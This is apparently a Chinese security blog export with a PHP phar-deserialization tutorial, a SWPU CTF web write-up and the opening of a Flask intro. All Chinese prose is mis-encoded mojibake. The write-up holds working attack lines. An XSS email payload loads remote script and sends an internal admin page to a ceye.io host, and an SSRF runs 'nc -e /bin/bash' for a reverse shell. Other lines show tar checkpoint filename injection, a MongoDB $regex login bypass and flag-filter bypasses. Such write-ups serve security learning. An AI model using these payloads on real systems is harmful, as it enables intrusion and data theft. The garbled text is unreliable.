pharÊñá‰ª∂Êú¨Ë¥®‰∏äÊòØÂéãÁº©Êñá‰ª∂ÔºåÊàë‰ª¨ÈÄöËøápharÂçèËÆÆÊù•ËØªÂèñÂéãÁº©Êñá‰ª∂„ÄÇÂú®ÂéãÁº©ÁöÑÊó∂ÂÄôÔºåÂéãÁº©Êñá‰ª∂ÁöÑÊùÉÈôê„ÄÅÂ±ûÊÄßÁ≠â‰ø°ÊÅØÈÉΩÊîæÂú®ËøôÈÉ®ÂàÜ„ÄÇËøôÈÉ®ÂàÜËøò‰ºö‰ª•Â∫èÂàóÂåñÁöÑÂΩ¢ÂºèÂ≠òÂÇ®Áî®Êà∑Ëá™ÂÆö‰πâÁöÑmeta-data„ÄÇÊàë‰ª¨ÈÄöËøáËøôÈÉ®ÂàÜÂ∫èÂàóÂåñÔºåÊù•ÈÄ†ÊàêÂêéÈù¢ÁöÑÊîªÂáª„ÄÇ 3.Ë¢´ÂéãÁº©ÁöÑÊñá‰ª∂ÂèäÂÜÖÂÆπÂπ∂‰∏çÈáçË¶ÅÔºåÂõ†‰∏∫Êàë‰ª¨ÈúÄË¶ÅÁöÑÊòØmeta-dataÁöÑÂèçÂ∫èÂàóÂåñ„ÄÇ 4.a signature for verifying Phar integrityÁ≠æÂêçÊ†ºÂºè ÂÖàÂà©Áî®php‰ª£Á†ÅÁîüÊàêpharÊñá‰ª∂„ÄÇ &lt;?php class Test{ public $test=&quot;test&quot;; } @unlink(&quot;test.phar&quot;); $phar = new Phar(&quot;test.phar&quot;); //ÂêéÁºÄÂêçÂøÖÈ°ª‰∏∫phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //ËÆæÁΩÆstub $o = new Test(); $phar-&gt;setMetadata($o); //Â∞ÜËá™ÂÆö‰πâÁöÑmeta-dataÂ≠òÂÖ•manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //Ê∑ªÂä†Ë¶ÅÂéãÁº©ÁöÑÊñá‰ª∂ÔºåÂÜÖÂÆπÊó†ÊâÄË∞ì„ÄÇ $phar-&gt;stopBuffering(); //Á≠æÂêçËá™Âä®ËÆ°ÁÆó ?&gt;ÊâßË°åphpÊñá‰ª∂ÁîüÊàêtest.pharÁöÑÊñá‰ª∂„ÄÇÔºåÂèØ‰ª•ÁúãÂà∞Â∑≤ÁªèËøõË°å‰∫ÜÂ∫èÂàóÂåñ„ÄÇ Âú®‰ΩøÁî®Phar:// ÂçèËÆÆÊµÅËß£ÊûêPharÊñá‰ª∂Êó∂ÔºåMeta-data‰∏≠ÁöÑÂÜÖÂÆπ‰πü‰ºöËøõË°åÂèçÂ∫èÂàóÂåñ„ÄÇ &lt;?php echo file_get_contents(&quot;phar://./test.phar/test.txt&quot;); ?&gt;ÂèØ‰ª•ÁúãÂà∞Â∑≤ÁªèÂèçÂ∫èÂàóÂåñËØªÂà∞‰∫ÜpharÊñá‰ª∂ÈáåÁöÑtest.txt phpÁöÑËÆ∏Â§öÊñá‰ª∂Á≥ªÁªüÂáΩÊï∞Âú®phar://Ëß£ÊûêÊó∂ÈÉΩ‰ºöÂèçÂ∫èÂàóÂåñ„ÄÇ ËøôÈáåÁÆÄÂçïÁêÜËß£‰∏ãÔºå &lt;?php class TestObject { } @unlink(&quot;phar.phar&quot;); $phar = new Phar(&quot;phar.phar&quot;); //ÂêéÁºÄÂêçÂøÖÈ°ª‰∏∫phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //ËÆæÁΩÆstub $o = new TestObject(); $phar-&gt;setMetadata($o); //Â∞ÜËá™ÂÆö‰πâÁöÑmeta-dataÂ≠òÂÖ•manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //Ê∑ªÂä†Ë¶ÅÂéãÁº©ÁöÑÊñá‰ª∂ //Á≠æÂêçËá™Âä®ËÆ°ÁÆó $phar-&gt;stopBuffering(); ?&gt;ÂÖàÁîüÊàêphar.pharÊñá‰ª∂„ÄÇÁÑ∂ÂêéÊµãËØïphp‰ª£Á†Å„ÄÇ &lt;?php class TestObject { public function __destruct() { echo &apos;Destruct called&apos;; } } if(file_exists($_GET[&apos;file&apos;])) exit; ?&gt; ÂèØ‰ª•ÁúãÂà∞ËæìÂá∫‰∫Ü Destruct calledÔºåÊàêÂäüÊâßË°å‰∫ÜÁ±ªTestObject„ÄÇ‰ª£Á†Å if(file_exists($_GET[&apos;file&apos;])) exit;Áõ∏ÂΩì‰∫éÂèòÊàê‰∫Ü $o = new TestObject(); Âú®file_existsÊó∂ÂÄôÂèçÂ∫èÂàóÂåñÔºåËøòÂéü‰∫Ü‰º†ÂÖ•ÁöÑphp‰ª£Á†Å„ÄÇ ÂèÇËÄÉswpuÁöÑ‰∏ÄÈÅìCTFÈ¢òÁõÆ‚Äì&gt;&gt; SimplePHP https://www.anquanke.com/post/id/168338]]></content>
      <tags>
        <tag>webÊºèÊ¥û</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[swpuÁ¨¨‰πùÂ±äÁ∫ø‰∏äctf]]></title>
    <url>%2F2018%2F12%2F21%2F%E7%AC%AC%E4%B9%9D%E5%B1%8Aswpuctf%2F</url>
    <content type="text"><![CDATA[ÂâçË®ÄÂú®ÂéÜÂ±äswpuctf‰∏≠È¢òË¥®ÈáèÈÉΩÊòØÊØîËæÉÈ´òÁöÑÔºåÊ≠§Ê¨°ÊúâÂπ∏Á¨¨‰∏ÄÊ¨°ÂèÇÂä†swpuctfÔºåÈ¢òË¥®ÈáèÁ°ÆÂÆûÂæàÈ´ò„ÄÇÊúüÂæÖÊòéÂπ¥ÁöÑÈ¢òÁõÆ- -ÔºÅÔºÅÔºÅ ÊÄªÁªì‰∏âÈÅìÊú¨Ê¨°ÊØîËµõÁöÑwebÈ¢òÁõÆ„ÄÇ 1.ÊúâË∂£ÁöÑÈÇÆÁÆ±Ê≥®ÂÜåÈ¶ñÂÖàÊâìÂºÄÈ°µÈù¢„ÄÇÂæàÊ≠£Â∏∏ÁöÑ‰∏Ä‰∏™Ê†áÂáÜÈ°µÈù¢„ÄÇÊ≤°Âï•‰ø°ÊÅØ„ÄÇ Â∑¶‰∏äËßíÊúâÈÇÆÁÆ±È™åËØÅ„ÄÇÊâìÂºÄÈÇÆÁÆ±È™åËØÅ„ÄÇÊµãËØï‰πüÂπ∂Ê≤°ÊúâÊ≥®ÂÖ•„ÄÇËøòÊúâ‰∏™ÂêéÂè∞ÁÆ°ÁêÜ„ÄÇ ‰∏çÂÖÅËÆ∏Â§ñÂú∞ËÆøÈóÆ„ÄÇX-Forward-For:127.0.0.1 ‰πü‰∏çÂ•Ω‰Ωø„ÄÇËøô‰∏™Êó∂ÂÄôÂ∫îËØ•ÊòØssrfÔºå‰ΩÜÊòØÂπ∂Ê≤°ÊúâssrfÁöÑÁÇπ„ÄÇËøôÊó∂ÂÄôËÄÉËôëÊ≥®ÂÜåÈÇÆÁÆ±ÁöÑÊó∂ÂÄô‰ºöËøîÂõûÊ≥®ÂÜåÁöÑÈÇÆÁÆ±ÔºåÈÇ£‰πàÂ∫îËØ•‰ºöÊúâXSS„ÄÇXSSÂä†ËΩΩËÑöÊú¨ÂØºËá¥ssrf„ÄÇ ‰ΩÜÊòØÊúâÈÇÆÁÆ±È™åËØÅ„ÄÇÈúÄË¶ÅÁªïËøáÔºåÂà©Áî®ÂèåÂºïÂè∑ÁªïËøáÈÇÆÁÆ±Ê≥®ÂÜå„ÄÇÂ¶Ç &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;@qq.com„ÄÇ ÂèØ‰ª•ÁúãÂà∞Âá∫Áé∞‰∫ÜÂºπÁ™ó„ÄÇ Ê≠§Êó∂ÂèØ‰ª•Âä†ËΩΩjsËÑöÊú¨‰∫Ü„ÄÇ var a = new XMLHttpRequest(); a.open(&apos;GET&apos;, &apos;http://localhost:6324/admin/admin.php&apos;, false); a.send(null); b = a.responseText; location.href = &apos;http://3jma2m.ceye.io/d?&apos; + escape(b);poc &quot;&lt;script/src=http://47.106.xx.XX/11.js&gt;&lt;/script&gt;&quot;@qq.comËøôÈáåjsÂÜôÂú®ÊàëÁöÑvps‰∏ªÊú∫‰∏äÔºåÊâßË°åjs‰πãÂêéÔºåÂ∞ÜÈ°µÈù¢ËøîÂõûÁöÑ‰ø°ÊÅØ‰ª•urlÁöÑÂΩ¢ÂºèÂéªËÆøÈóÆ„ÄÇËøôÈáåÊàë‰ª¨‰ΩøÁî®http://ceye.ioÊù•Êé•Êî∂ËÆøÈóÆ‰ø°ÊÅØ„ÄÇ ÂèØ‰ª•ÁúãÂà∞ÊòØ‰∏™ÂëΩ‰ª§ÊâßË°å„ÄÇ ÁÑ∂ÂêéÊàë‰ª¨ÁªßÁª≠ÊûÑÈÄ†ssrfÊù•ÊâßË°åÂëΩ‰ª§ÂèçÂºπshell var a = new XMLHttpRequest(); a.open(&apos;GET&apos;, &apos;http://localhost:6324/admin/a0a.php?cmd=nc+-e+%2fbin%2fbash+47.106.xx.xx+8888&apos;, false); a.send(null); b = a.responseText; location.href = &apos;http://3jma2m.ceye.io/d&apos; + escape(b);Á¨¨‰∫åË°åÊ≥®ÊÑèÂèçÂºπshellË¶ÅÁºñÁ†Å http://localhost:6324/admin/a0a.php?cmd=nc+-e+%2fbin%2fbash+47.106.xx.xx+8888Êú¨Âú∞vps ÁõëÂê¨ nc -lvvp 8888 Ê≠§Êó∂Êàë‰ª¨ÂèØ‰ª•ÁúãÂà∞ÂèçÂºπshellÊàêÂäüÔºå ‰ΩÜÊòØflagÊñá‰ª∂ÈúÄË¶ÅÊùÉÈôêÔºåËÄåÊàë‰ª¨ÊùÉÈôêÁúã‰∏çÂà∞„ÄÇÊ≠§Êó∂ÂØªÊâæÁõÆÂΩïÂèëÁé∞‰∏Ä‰∏™Ê≤°ËßÅËøáÁöÑÁõÆÂΩï„ÄÇ ÊâìÂºÄurl http://118.89.56.208:6324/4f0a5ead5aef34138fcbf8cf00029e7b/ ÁúãÂà∞‰∏ä‰º†ÂíåÂ§á‰ªΩÊñá‰ª∂Áû¨Èó¥Â∞±ÊÉ≥Âà∞‰∫Ü‰∏ä‰º†Êñá‰ª∂Â§á‰ªΩÊãøshell„ÄÇ‰ΩÜÊòØËøôÈáåÂèëÁé∞‰∏ä‰º†phpÊñá‰ª∂‰πüÂèØ‰ª•ÔºåÈÇ£ÂæàÊ∏ÖÊ•öÈóÆÈ¢ò‰∏çÁÆÄÂçï„ÄÇ‰∏ä‰º†‰πãÂêéÊâæ‰∏çÂà∞Ë∑ØÂæÑ„ÄÇÁªèËøá‰∏ÄÁï™ÊÄùÁ¥¢Ôºå‰ªñÁ°ÆÂÆû‰∏çÁªôË∑ØÂæÑ‰Ω†‰πüÊâæ‰∏çÂà∞„ÄÇÊ≠§Êó∂ÔºåÂà©Áî®ËØ•ÂàöÂàöÁöÑ‰ΩéÊùÉshell„ÄÇÊü•Áúã‰∏Ä‰∏™ÂèØ‰ª•ÁúãÁöÑÊñá‰ª∂ backup.php„ÄÇ &lt;?php include(&quot;upload.php&quot;); echo &quot;‰∏ä‰º†ÁõÆÂΩïÔºö&quot; . $upload_dir . &quot;&lt;br /&gt;&quot;; $sys = &quot;tar -czf z.tar.gz *&quot;; chdir($upload_dir); system($sys); if(file_exists(&apos;z.tar.gz&apos;)){ echo &quot;‰∏ä‰º†ÁõÆÂΩï‰∏ãÁöÑÊâÄÊúâÊñá‰ª∂Â§á‰ªΩÊàêÂäü!&lt;br /&gt;&quot;; echo &quot;Â§á‰ªΩÊñá‰ª∂Âêç: z.tar.gz&quot;; }else{ echo &quot;Êú™‰∏ä‰º†Êñá‰ª∂ÔºåÊó†Ê≥ïÂ§á‰ªΩÔºÅ&quot;; } ?&gt;ÊâÄÊúâ‰∏úË•øÈÉΩÂæàÊ≠£ËßÑ„ÄÇÂîØ‰∏ÄÊúâ‰∏ÄÂè•ÁúãÁùÄÊúâÁÇπÂÉèÊúâÈóÆÈ¢òÁöÑÊ†∑Â≠ê„ÄÇ $sys = &quot;tar -czf z.tar.gz *&quot;; chdir($upload_dir); system($sys);system ÊïèÊÑüÂáΩÊï∞„ÄÇÂèØËÉΩÈóÆÈ¢òÂá∫Âú®ËøôÈáå„ÄÇÁÑ∂ÂêéÂ∞±Êúâ‰∫Ü‰∏ãÈù¢ËøôÁØáÊñáÁ´†Ôºå https://blog.csdn.net/qq_27446553/article/details/80943097 ËØªÂÆå‰πãÂêéÂèëÁé∞ËøôÈáå‰ºöÊúâ‰∏Ä‰∏™ÂëΩ‰ª§ÊâßË°å„ÄÇÁåúÊµã„ÄÇÂ∫îËØ•ÊòØÈúÄË¶ÅÁî®flagÁöÑË∫´‰ªΩÊù•Êü•ÁúãflagÊñá‰ª∂„ÄÇ‰πüÂ∞±ÊòØÂà©Áî®flagÊùÉÈôêÊâßË°åÂëΩ‰ª§„ÄÇ poc‰∏∫Ôºö ‰∏ä‰º†‰∏â‰∏™Êñá‰ª∂„ÄÇ ÂêçÂ≠óÂàÜÂà´‰∏∫„ÄÇ 6.sh --checkpoint-action=exec=sh 6 --checkpoint=1ÁÑ∂ÂêéÂ§á‰ªΩÊñá‰ª∂„ÄÇÁúã‰∏äÈù¢ÈÇ£ÁØáÊñáÁ´†Â∞±ÂèØ‰ª•‰∫Ü„ÄÇÈáçÁÇπÂú®‚Äì„ÄÇÂØºËá¥ÂëΩ‰ª§ÊâßË°å„ÄÇÂæóÂà∞flag„ÄÇ ÂØπÊàëÊù•ËØ¥ÂæàÂñúÊ¨¢ËøôÈÅìÈ¢òÔºåÂ≠¶Âà∞‰∫ÜÂæàÂ§ö„ÄÇ 2.Injection ???nosqlÊ≥®ÂÖ•„ÄÇ ËøôÈÅìÈ¢òÁõ∏ÂØπÊØîËæÉÁÆÄÂçï„ÄÇ‰ΩÜÊòØÂú®ÊàëÁöÑÁü•ËØÜÁõ≤Âå∫„ÄÇËøòÊòØËÆ∞ÂΩï‰∏ã„ÄÇ ÊâìÂºÄÂ∞±ÊòØ‰∏™ÁôªÈôÜÊ°ÜÔºåÂº±Âè£‰ª§‰∏áËÉΩÂØÜÁ†ÅÊ≥®ÂÖ•ÔºåÂÖ®ÈÉΩÊó†Êïà„ÄÇÈ¢òÁõÆÁªôÁöÑÂêçÂ≠óÊòØÊ≥®ÂÖ•„ÄÇËØï‰∫ÜÂçäÂ§©ÔºåÊÄª‰∏çÂèØËÉΩÊØ´Êó†‰∫∫ÊÄßÁöÑ‰∏çÊòØÊ≥®ÂÖ•Êää„ÄÇ‰ΩÜÊòØÁ°ÆÂÆûÊ≤°ÂºÑÂá∫Êù•ÔºåÊ∂âÂèäÂà∞Áü•ËØÜÁõ≤Âå∫‰∫Ü„ÄÇnosqlÊ≥®ÂÖ•„ÄÇ‰∏çÊôìÂæóÁöÑÂèØ‰ª•ÁôæÂ∫¶‰∫ÜËß£‰∏ãÔºå‰πüÂ∞±ÊòØÂØπ‰∏Ä‰∫õ‰∏çÈÄÇÁî®‰∫ésqlËØ≠Âè•ÁöÑÊï∞ÊçÆÂ∫ì„ÄÇÊàë‰ª¨ÈúÄË¶ÅÁî®ÈùûsqlËØ≠Âè•Êù•Ê≥®ÂÖ•„ÄÇ Êü•ÁúãÈ°µÈù¢Ê∫êÁ†ÅÊúâ‰∏™ÊèêÁ§∫„ÄÇ &lt;!-- tips:info.php --&gt;Êü•ÁúãphpinfoÔºåÊòæÁ§∫ÊãìÂ±ïÊòØmongodbÊï∞ÊçÆÂ∫ìÔºåÈÇ£Â∫îËØ•Â∞±ÊòØnosqlÊ≥®ÂÖ•‰∫Ü„ÄÇÂèÇËÄÉÊñáÁ´†ÈìæÊé•Ôºöhttps://www.secpulse.com/archives/3278.html ÁÆÄÂçïËØ¥‰∏Ä‰∏ãÔºå‰πüÂ∞±ÊòØÂà©Áî®phpÁöÑ‰º†ÈÄíÂèÇÊï∞ÁöÑÊùæÊï£ÊÄß„ÄÇÊàë‰ª¨ÂèØ‰ª•‰º†ÈÄíÊï∞ÁªÑ„ÄÇËÄåÂõ†‰∏∫mongodbÊï∞ÊçÆÂ∫ìËß£ÊûêÂèÇÊï∞ÁöÑÁâπÊÄßÔºåÂèØ‰ª•ÈÄöËøáÊ≠£ÂàôÊù•ÈááÁåúËß£Ë¥¶Âè∑ÂØÜÁ†Å„ÄÇ ÁªôÂá∫‰∏ÄÁªÑpoc„ÄÇÊàë‰ª¨ÂÖàÂåπÈÖçË¥¶Âè∑ ÊâÄ‰ª•ÂØÜÁ†Å ÂÜô‰∏∫password[$regex]=1Ôºü‰πüÂ∞±ÊòØÂåπÈÖç1‰∏ÄÊ¨°Êàñ0Ê¨°Ôºå‰∏çËÆ∫Â¶Ç‰ΩïÈÉΩ‰ºö‰∏∫Áúü„ÄÇÊåâÁÖßËøô‰∏™Â•óË∑ØÂ∞±ÂèØ‰ª•ÂåπÈÖçÂÆåË¥¶Âè∑„ÄÇË¥¶Âè∑‰∏∫adminÔºåÊâÄ‰ª•ÂåπÈÖç‰∏∫Áúü„ÄÇÂ¶ÇÊûúusername[$regex]=bÔºåÂàô‰ºöËØ¥Ë¥¶Âè∑ÂØÜÁ†ÅÈîôËØØ„ÄÇËøôÊ†∑ÈÄê‰∏∫ÁàÜÁ†¥Âá∫Ë¥¶Âè∑ÂØÜÁ†ÅÁôªÈôÜÂç≥ÂèØÂºπÂá∫flag„ÄÇ 3.Áî®‰ºòÊÉ†Á†Å ‰π∞‰∏™ X ÔºüÊú¨Êù•ÊÉ≥ÂÜôflaskÈÇ£‰∏™pythonÈ¢òÔºåÂ•à‰ΩïÊ≤°Â≠¶ËøápythonÂºÄÂèëÔºåÂÆûÂú®Â§¥Áñº„ÄÇ ËøôÈÅìÈ¢òÊ∂âÂèäÂà∞php‰º™ÈöèÊú∫Êï∞Ôºå‰πüÊòØÁ¨¨‰∏ÄÊ¨°ÈÅáÂà∞ÔºåÂ≠¶‰π†‰∏Ä‰∏ã„ÄÇ È¶ñÂÖàÊ≥®ÂÜå‰∏Ä‰∏™Ë¥¶Âè∑‰ºöÁªô‰Ω†‰∏Ä‰∏™ÂçÅ‰∫î‰ΩçÁöÑÈÇÄËØ∑Á†ÅÔºåÈÇÄËØ∑Á†ÅÊòØÈöèÂç≥ÁßçÂ≠êÁîüÊàêÁöÑÔºåÂà©Áî®ÈÇÄËØ∑Á†ÅÊù•ËøõË°å‰∏ã‰∏ÄÊ≠•ÁöÑÁªïËøá„ÄÇËøôÈáåÂÖàËØ¥Á¨¨‰∏ÄÊ≠•ÔºåÈáçÁÇπ‰πüÊòØÁ¨¨‰∏ÄÊ≥¢php‰º™ÈöèÊú∫Êï∞ÁöÑÁàÜÁ†¥„ÄÇ www.zipÊ∫êÁ†ÅÊ≥ÑÈú≤„ÄÇgetÊ∫êÁ†Å ÈÄöËØªÊ∫êÁ†Å„ÄÇ. &lt;?php //ÁîüÊàê‰ºòÊÉ†Á†Å $_SESSION[&apos;seed&apos;]=rand(0,999999999); function youhuima(){ mt_srand($_SESSION[&apos;seed&apos;]); $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;; $auth=&apos;&apos;; $len=15; for ( $i = 0; $i &lt; $len; $i++ ){ if($i&lt;=($len/2)) $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1); else $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1); } setcookie(&apos;Auth&apos;, $auth); } //support if (preg_match(&quot;/^\d+\.\d+\.\d+\.\d+$/im&quot;,$ip)){ if (!preg_match(&quot;/\?|flag|}|cat|echo|\*/i&quot;,$ip)){ //ÊâßË°åÂëΩ‰ª§ }else { //flagÂ≠óÊÆµÂíåÊüê‰∫õÂ≠óÁ¨¶Ë¢´ËøáÊª§! } }else{ // ‰Ω†ÁöÑËæìÂÖ•‰∏çÊ≠£Á°Æ! } ?&gt;‰∏çÈöæÂèëÁé∞ÔºåËøôÊòØ‰∏§Á´ØphpÔºåÁ¨¨‰∏ÄÊÆµÊòØphp‰º™ÈöèÊú∫Êï∞ÔºåÁ¨¨‰∫å‰∏™ÊòØ‰∏ã‰∏ÄÊ≠•ÁªïËøá„ÄÇ ÈÄöËØªÁ¨¨‰∏ÄÈÉ®ÂàÜÊ∫êÁ†ÅÔºå‰ªé‰∏Ä‰∏≤ÊûÑÈÄ†ÁöÑÂ≠óÁ¨¶‰∏≤‰∏≠ÈÄâÂèñÂ≠óÁ¨¶Êù•ÊûÑÈÄ†‰∏∫15ÈïøÂ∫¶ÁöÑÈöèÂç≥Á†ÅÔºåÂÖ∂ÂÆûÂπ∂‰∏çÈöèÊú∫„ÄÇÂõ†‰∏∫‰∏ÄÊó¶‰Ω†Áü•ÈÅì‰∫Ümt_randÔºåÈÇ£‰πàËøô‰∏≤Êï∞Â≠óËøòÊòØÈöèÊú∫ÁöÑÂêóÔºåÊòæÁÑ∂Âπ∂‰∏çÊòØÔºå‰∏∫‰ªÄ‰πàËØ¥ÈöèÊú∫Êï∞Âπ∂‰∏çÈöèÊú∫ÔºåÊàë‰ª¨Êù•ËøõË°å‰∏ãÂ¶Ç‰∏ãÊµãËØï„ÄÇ &lt;?php mt_srand(10); echo mt_rand(); ?&gt; Ëá™ PHP 4.2.0 Ëµ∑Ôºå‰∏çÂÜçÈúÄË¶ÅÁî® srand() Êàñ mt_srand() ÁªôÈöèÊú∫Êï∞ÂèëÁîüÂô®Êí≠Áßç ÔºåÂõ†‰∏∫Áé∞Âú®ÊòØÁî±Á≥ªÁªüËá™Âä®ÂÆåÊàêÁöÑ„ÄÇ ÁÆÄÂçïÁöÑÂ¶Ç‰∏ä‰ª£Á†ÅÔºåÂÖ∂ÂÆûËøõË°åÊí≠Áßç10„ÄÇ‰Ω†‰ºöÂèëÁé∞ÊâìÂç∞Âá∫Êù•mt_rand() ÂßãÁªà‰∏∫502355954Ôºå‰πüÂ∞±ÊòØ„ÄÇÂú®ÂÆûÈôÖÊÉÖÂÜµ‰∏≠‰∏çÂÜçÈúÄË¶Åmt_srandÊí≠ÁßçÔºå‰∏äÂõæÁÆÄÂçïÊµãËØï‰∏ãÔºåÁßçÂ≠êÁ°ÆÂÆöÁöÑËØùÔºåÈöèÊú∫Êï∞‰πüÂ∞ÜÊòØÁ°ÆÂÆöÁöÑ„ÄÇÂÆûÈôÖÊÉÖÂÜµ‰∏≠mt_rand()Âç≥ÂèØ‰∫ßÁîüÈöèÊú∫Êï∞ÔºåÁßçÂ≠êËåÉÂõ¥‰∏∫(0,999999999)Ôºå‰πüÂ∞±ÊòØ‰ºö‰∫ßÁîüÂçÅ‰∫ø‰∏™ÈöèÊú∫Êï∞ÔºåËøô‰∏™Êó∂ÂÄôÂèëÁé∞Â¶ÇÊûúÊúâËøô‰πà‰∏Ä‰∏™ÁàÜÁ†¥Â∑•ÂÖ∑ÔºåÈÇ£‰πàÈöèÊú∫Êï∞‰∏çÂÜçÈöèÊú∫Êàë‰ª¨Âè™ÈúÄË¶ÅÁàÜÁ†¥Âá∫ÁßçÂ≠êÂç≥ÂèØ„ÄÇ ÁªèËøá‰∏äÈù¢ÁöÑËß£ÈáäÔºå‰Ω†Áé∞Âú®ÊòØ‰∏çÊòØÂØπÈöèÊú∫Êï∞Êúâ‰∫õ‰∫ÜËß£‰∫Ü„ÄÇÁªìÂêàÈ¢òÁõÆÔºåÂè™Ë¶ÅÊàë‰ª¨Áü•ÈÅìÁßçÂ≠êÔºåÂç≥ÂèØÁîüÊàê‰∫åÂçÅÂõõ‰ΩçÁöÑ‰ºòÊÉ†Á†ÅÔºåÁÑ∂ÂêéÂç≥ÂèØËøõË°å‰∏ã‰∏ÄÊ≠•Êìç‰Ωú„ÄÇ‰ΩÜÊòØËøôÂíØÈúÄË¶ÅÊèêÁ§∫ÁöÑÊòØÔºåphp‰∏çÂêåÁâàÊú¨ÈöèÊú∫Êï∞ÊòØ‰∏ç‰∏ÄÊ†∑ÁöÑÔºåÂ¶Ç7.0‰∏é7.2‰∏ç‰∏ÄÊ†∑ÔºåÊâÄ‰ª•Â¶ÇÊûú‰Ω†Ë¶ÅÂíåÈ¢òÁõÆ‰∏≠ÁöÑphpÁâàÊú¨‰∏•Ê†ºÂåπÈÖçÊâçËÉΩÁàÜÁ†¥Âá∫Ê≠£Á°ÆÁöÑÁßçÂ≠ê„ÄÇ Êé®Ëçê‰∏ÄÊ¨æÂ∑•ÂÖ∑ php_mt_seed-4.0 &lt;?php $allowable_characters = &apos;abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789&apos;; $len = strlen($allowable_characters) - 1; $pass = $argv[1]; for ($i = 0; $i &lt; strlen($pass); $i++) { $number = strpos($allowable_characters, $pass[$i]); echo &quot;$number $number 0 $len &quot;; } echo &quot;\n&quot;; ?&gt;Ê≠§È¢òÁàÜÁ†¥ËÑöÊú¨ÂÆòÊñπwriteup‰∏äÊúâÔºåÁîüÊàê ‰∫§Áªô php_mt_seed-4.0Âç≥ÂèØÔºå ÂØπ‰∫éRCEÁªïËøá„ÄÇ if (preg_match(‚Äú/^\d+.\d+.\d+.\d+$/im‚Äù,$ip)){ÈáçÁÇπÂú®ÂèÇÊï∞m„ÄÇ ÂΩìËøô‰∏™‰øÆÈ•∞Á¨¶ËÆæÁΩÆ‰πãÂêéÔºå‚ÄúË°åÈ¶ñ‚ÄùÂíå‚ÄúË°åÊú´‚ÄùÂ∞±‰ºöÂåπÈÖçÁõÆÊ†áÂ≠óÁ¨¶‰∏≤‰∏≠‰ªªÊÑèÊç¢Ë°åÁ¨¶‰πãÂâçÊàñ‰πãÂêéÔºåÂè¶Â§ñÔºå ËøòÂàÜÂà´ÂåπÈÖçÁõÆÊ†áÂ≠óÁ¨¶‰∏≤ÁöÑÊúÄÂºÄÂßãÂíåÊúÄÊú´Â∞æ‰ΩçÁΩÆ„ÄÇËøôÁ≠âÂêå‰∫é perl ÁöÑ /m ‰øÆÈ•∞Á¨¶„ÄÇÂ¶ÇÊûúÁõÆÊ†áÂ≠óÁ¨¶‰∏≤ ‰∏≠Ê≤°Êúâ ‚Äún‚Äù Â≠óÁ¨¶ÔºåÊàñËÄÖÊ®°Âºè‰∏≠Ê≤°ÊúâÂá∫Áé∞ ^ Êàñ $ÔºåËÆæÁΩÆËøô‰∏™‰øÆÈ•∞Á¨¶‰∏ç‰∫ßÁîü‰ªª‰ΩïÂΩ±Âìç„ÄÇ‰πüÂ∞±ÊòØËØ¥ ^Âíå$‰ºöÂåπÈÖç Â≠óÁ¨¶‰∏≤‰∏≠n‰πãÂâçÂíå‰πãÂêéÔºå‰πü‰ºöÂåπÈÖçÊï¥‰∏™Â≠óÁ¨¶‰∏≤ÁöÑÂºÄÂßãÂíåÁªìÂ∞æÔºå‰ΩÜÊòØÂè™Ë¶ÅÂåπÈÖçÂà∞‰∏Ä‰∏™Â∞±‰ºöËøîÂõûÊ≠£Á°Æ ÁªïËøáÈÄâÊã© [c]at [f][l][a][g]„ÄÇlinux‰∏≠‰ºöÂåπÈÖç[]‰∏≠‰ªªÊÑè‰∏Ä‰∏™Â≠óÁ¨¶ÔºåÊàñËÄÖ ÈÄâÊã©ËΩ¨‰πâ ca\t f\lag]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Flask‰ªéÈõ∂Âà∞Êó†]]></title>
    <url>%2F2018%2F12%2F14%2Fflask%E4%BB%8E0%E5%88%B0%E6%97%A0%2F</url>
    <content type="text"><![CDATA[Èõ∂Âü∫Á°ÄÂ≠¶Ëµ∑Â≠¶‰π†flaskÊàëÈÄâÊã©‰∫Ü pycharmÔºåÂ≠¶ÁîüÁöÑËØùÂèØ‰ª•ÂÖçË¥π‰∏ãËΩΩ‰∏ì‰∏öÁâà„ÄÇÂ∫üËØù‰∏çÂ§öËØ¥‰∫Ü„ÄÇ ÁéØÂ¢ÉÔºöpython 3.6+Âü∫Á°ÄÔºö0-Êó•ÊúüÔºö2018.12.14 flaskÂÖ•Èó®ÁÆÄÂçïÊµãËØïpycharmÂÆâË£Öflask‰ºöËá™Âä®ÂØºÂÖ•‰∫ÜflaskÊâÄÈúÄÁöÑÊ®°ÂùóÔºåÊâÄ‰ª•Êàë‰ª¨Âè™ÈúÄË¶ÅÂëΩ‰ª§ÂÆâË£ÖÊâÄÈúÄË¶ÅÁöÑÂåÖÂ∞±ÂèØ‰ª•‰∫ÜÔºåÂª∫ËÆÆÁî®python3.6Â≠¶‰π†ËÄå‰∏çÊòØ2.7ÔºåÊØïÁ´üdjangoÈÉΩÂø´Ë¶Å‰∏çÊîØÊåÅ2.7‰∫ÜÔºåÊó©Êç¢Êó©Ë∂ÖÁîü„ÄÇ Ëá™Âä®ÂØºÂÖ•ÁöÑ‰πüÊòØpython 3.6„ÄÇ ËøêË°åËøôËæπ‰ºöÂá∫Â∞èÈîôÔºåÂõ†‰∏∫Ê≠§Êó∂Êàë‰ª¨ËøòÊ≤°ÊúâÂÆâË£ÖflaskÂåÖÔºå ËøôÊ†∑Â∞±ÂèØ‰ª•Ê≠£Â∏∏ËøêË°å‰∫ÜÔºåËøêË°åÊàêÂäü‰æø‰ºöËøîÂõû * Debug mode: off * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit) 127.0.0.1 - - [14/Dec/2018 20:32:20] &quot;GET / HTTP/1.1&quot; 200 - 127.0.0.1 - - [14/Dec/2018 20:32:20] &quot;GET /favicon.ico HTTP/1.1&quot; 404 -Ê≠§Êó∂ÂèØ‰ª•Âú®web‰∏äËøêË°åhello 